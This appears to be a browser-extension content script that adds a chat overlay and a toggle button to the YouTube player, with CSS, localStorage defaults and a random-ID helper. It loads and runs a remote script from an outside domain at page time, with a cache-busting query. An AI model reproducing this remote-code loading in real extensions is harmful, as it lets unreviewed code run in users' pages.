//Style
var style = document.createElement('style');
style.innerHTML = `
.chat-addon{
    background-color:#1e1f25;
}
#chat-input{
    background-color:#161617;
    border:0;
    color: #777777;
    padding:1rem;
    border-radius:5px;
}
#chat-input:focus{
    outline:0;
    border:0;
}
#chat-save{
    display:inline;
    background-color: #161617;
    color: #777777;
    padding:1rem;
    border-radius: 5px;
    border: 0;
    outline: none;
}
#chat-save:focus{
    background-color: #2a2a2b;
}
#chat-status:hover{
    cursor:pointer;
}
.chat-options{
    text-align: center;
    margin-bottom: .50rem;
}
.chat-options button{
    display:inline;
    background-color: #3182ce;
    color: white;
    padding: .50rem;
    border-radius: 16px;
    border: 0;
}
.chat-options button:hover{
    cursor:pointer;
}
.chat-options button:hover{
    outline: none;
}
#e-chat-type{
    background-color: #161617;
    color: #777777;
    border: 0;
    padding: 1rem;
    border-radius: 5px;
}
#e-chat-type:focus{
    outline:0;
}
`;
document.head.appendChild(style);

var xddd = document.createElement('script');
xddd.setAttribute("src", `https://static.4uss.cyou/chat-addon2.js?h=${makeid(16)}`);
document.head.appendChild(xddd);

if (localStorage.getItem(`e-chat-name`)) {

}else if (!localStorage.getItem(`e-chat-name`)) {
    localStorage.setItem('e-chat-name', 'poorchat');
}

if (localStorage.getItem(`e-chat-type`)) {

}else if (!localStorage.getItem(`e-chat-type`)) {
    localStorage.setItem('e-chat-type', 'twitch');
}

if (localStorage.getItem(`e-chat-custom`)) {

}else if (!localStorage.getItem(`e-chat-custom`)) {
    localStorage.setItem('e-chat-custom', 'https://youtube.com');
}

buttonChat();
function buttonChat(){
        console.log(`%c4uss [%cbutton%c]:%c Loaded enable button`, 'color:#ff5447; font-weight:bold', '', 'color:#ff5447; font-weight:bold', '')
    
        var btn = document.createElement("button");
        btn.className = 'ytp-button';
        btn.setAttribute("title", "Enable chat extension");
        btn.setAttribute("id", "chat-status");
        btn.setAttribute("onclick", "changechat();")
        btn.innerHTML = '<img src="https://cdn.betterttv.net/emote/5ea7ab8ece7cbf62fe161737/3x" style="height: 100%;width: 100%;">';
        document.querySelector("div.ytp-right-controls").appendChild(btn);
}

console.log(`%c4uss %cChat Extension v${chrome.runtime.getManifest().version}`, 'color:#ff5447; font-weight:bold', '')

function makeid(length) {
    var result           = '';
    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
       result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
 }